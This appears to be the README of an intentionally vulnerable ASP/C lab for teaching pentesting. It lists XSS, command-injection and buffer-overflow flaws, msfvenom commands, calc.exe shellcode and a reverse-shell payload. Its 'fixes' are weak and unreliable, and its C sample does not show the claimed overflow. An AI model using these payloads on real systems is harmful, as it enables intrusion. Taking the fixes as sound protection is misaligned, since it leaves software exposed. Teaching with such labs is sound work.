# YrpreyASPC

![yprey](https://i.imgur.com/POSFjX8.png)

**Created by [Fernando Mengali](https://www.linkedin.com/in/fernando-mengali-273504142/)**

YrpreyASPC is a development framework for those interested in offensive security and application security to mitigate vulnerabilities. This framework aims to demonstrate vulnerabilities in ASP and how Cross-Site Scripting, Buffer Overflow, and remote command execution vulnerabilities work, exploiting the lack of sanitization in ASP processing and the executable software create_user.exe.


The framework was developed to teach and learn details in Pentest (testing penetration) and Application Security. In the context of Offensive Security, vulnerabilities contained in web applications can be identified, exploited and compromised. For application security professionals and experts, the framework provides an in-depth understanding of code-level vulnerabilities. Yrprey, making it valuable for educational, learning and teaching purposes in the field of Information Security. For more information about the vulnerabilities.

#### The system has the following vulnerabilities:

After understanding the scenario and the vulnerable route, the process of identifying and exploiting vulnerabilities becomes easier. If you are an Application Security professional, knowing the scenario and routes of endpoints makes the process of identifying and correcting vulnerabilities easier with manual Code Review Security techniques or automated SAST and DAST analyses

Complete table with points vulnerables, vulnerability details:



 ## The framework was written with the following technologies:

* 1º - ASP
* 2º - C language

#### List of Vulnerabilities

|Qtde |          **Vulnerabilties**          |**Method**|  **Path and attack**                |                   **Payload Example**                   |
|----:|:------------------------------------:|:--------:|:-----------------------------------:|:-------------------------------------------------------:|
| 01  |  XSS - Cross-site Scripting          |   GET    |  /index.asp                         |        XSS Basic                                        |
| 02  |  Remote Command Execution            |   N/A    |  create_user.exe pipe <command>     |   create_user.exe "pipe" ipconfig                       |
| 03  |  Buffer Overflow - Vanilla           |   N/A    |  create_user.exe <exploit payload>  |   create_user.exe (28 offset)+EIP+(16 0x90) + shellcode | 


## How Install IIS

* 1º - Access Control Panel: Click on "Start" and select "Control Panel".
* 2º - Add or Remove Programs: In the Control Panel, click on "Add or Remove Programs".
* 3º - Add/Remove Windows Components: On the left side, click on "Add/Remove Windows Components".Import the yrprey.sql into the database.
* 4º - Select Internet Information Services (IIS): In the list of Windows components, check the box for "Internet Information Services (IIS)".

## Configure IIS
* 1º - Access the IIS Manager: After installation, open the "Internet Information Services (IIS) Manager". To do this, click on "Start" > "Control Panel" > "Administrative Tools" > "Internet Information Services (IIS) Manager".
* 2º - Configure the Default Website:   In the IIS Manager, expand the local computer node and click on "Websites". You will see the "Default Website".
* 3º - Default Website Properties:   Right-click on the "Default Website" and select "Properties".
* 4º - Basic Settings:   In the "General" tab, you can view and change the physical path where the site files are stored.
* 5º - In the "Documents" tab, you can add or remove default pages such as default.asp or index.html.
* 6º - Security and Permissions: In the "Directory Security" tab, you can configure permissions and authentication for the site.

## Access to page

* 1º Add the ASP file, such as index.html or default.asp, and save it in the root directory of the "Default Website": C:\Inetpub\wwwroot.
* 2º Access the Site: Access the address http://localhost in your browser


## How to fix vulnerabilities

Sanitization Protect
```asp

Function SanitizeInput(input)
    SanitizeInput = Replace(input, "'", "''")
    SanitizeInput = Replace(SanitizeInput, ";", "")
    SanitizeInput = Replace(SanitizeInput, "&", "")
End Function

username = SanitizeInput(Request.Form("username"))
email = SanitizeInput(Request.Form("email"))
telephone = SanitizeInput(Request.Form("telephone"))


```

Protection to XSS
```asp

Function HTMLEncode(str)
    HTMLEncode = Server.HTMLEncode(str)
End Function
Response.Write "Username " & HTMLEncode(nome) & " successful!"


```

Protection to Remote Command Execution - RCE
```asp
If InStr(nome, "|") = 0 Then
    shell.Run "create_user.exe " & userme, 0, True
End If

```


### This is the vulnerable code in C language.
```c
    #include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char username[20];
    char mkdir_command[50];

    // Checks if the expected argument (username) has been passed
    if (argc != 2) {
        printf("Use: %s username\n", argv[0]);
        return 1;
    }

    // Copies the argument to the username variable
    strncpy(username, argv[1], sizeof(username) - 1);
    username[sizeof(username) - 1] = '\0';  // Garante que username seja terminado corretamente

    // Constructs the command to create the directory with the username
    snprintf(mkdir_command, sizeof(mkdir_command), "mkdir %s", username);

    // Executes the mkdir command to create the directory
    printf("Executing command: %s\n", mkdir_command);
    int result = system(mkdir_command);

    // Checks if the directory was created successfully
    if (result == 0) {
        printf("Directory '%s' created successfully.\n", username);
    } else {
        printf("Error creating directory '%s'.\n", username);
        return 1;  // Exits the program in case of an error during directory creation
    }

    // Here you can continue the flow of your program as needed

    return 0;
}

```


## Generate Shellcode calc.exe usage


Command msfvenom to generate calc.exe

````c
msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0a\x0d' EXITFUNC=thread -f python

````

````

\xd9\xe5\xd9\x74\x24\xf4\x5e\x29\xc9\xbf\x4e\x2d
\xb6\x3e\xb1\x31\x83\xc6\x04\x31\x7e\x14\x03\x7e
\x5a\xcf\x43\xc2\x8a\x8d\xac\x3b\x4a\xf2\x25\xde
\x7b\x32\x51\xaa\x2b\x82\x11\xfe\xc7\x69\x77\xeb
\x5c\x1f\x50\x1c\xd5\xaa\x86\x13\xe6\x87\xfb\x32
\x64\xda\x2f\x95\x55\x15\x22\xd4\x92\x48\xcf\x84
\x4b\x06\x62\x39\xf8\x52\xbf\xb2\xb2\x73\xc7\x27
\x02\x75\xe6\xf9\x19\x2c\x28\xfb\xce\x44\x61\xe3
\x13\x60\x3b\x98\xe7\x1e\xba\x48\x36\xde\x11\xb5
\xf7\x2d\x6b\xf1\x3f\xce\x1e\x0b\x3c\x73\x19\xc8
\x3f\xaf\xac\xcb\xe7\x24\x16\x30\x16\xe8\xc1\xb3
\x14\x45\x85\x9c\x38\x58\x4a\x97\x44\xd1\x6d\x78
\xcd\xa1\x49\x5c\x96\x72\xf3\xc5\x72\xd4\x0c\x15
\xdd\x89\xa8\x5d\xf3\xde\xc0\x3f\x99\x21\x56\x3a
\xef\x22\x68\x45\x5f\x4b\x59\xce\x30\x0c\x66\x05
\x75\xf2\x84\x8c\x83\x9b\x10\x45\x2e\xc6\xa2\xb3
\x6c\xff\x20\x36\x0c\x04\x38\x33\x09\x40\xfe\xaf
\x63\xd9\x6b\xd0\xd0\xda\xb9\xb3\xb7\x48\x21\x1a
\x52\xe9\xc0\x62
````

Exploited Buffer Overflow Vanilla - Calc.exe

![yprey](https://i.imgur.com/05hqd1F.png)

## Generate Shellcode shell reverse usage

Command msfvenom to generate calc.exe

````c

sfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> EXITFUNC=thread -b '\x00\x0a\x0d' -a x86 --platform Windows -f c

````

Exploited Buffer Overflow Vanilla - Shell Reverse

![yprey](https://i.imgur.com/ljv3tLs.png)

![yprey](https://i.imgur.com/MXMfA84.png)

## Observation
You can test on Windows XP with IIS.

## Reporting Vulnerabilities

Please, avoid taking this action and requesting a CVE!

The application intentionally has some vulnerabilities, most of them are known and are treated as lessons learned. Others, in turn, are more "hidden" and can be discovered on your own. If you have a genuine desire to demonstrate your skills in finding these extra elements, we suggest you share your experience on a blog or create a video. There are certainly people interested in learning about these nuances and how you identified them. By sending us the link, we may even consider including it in our references.
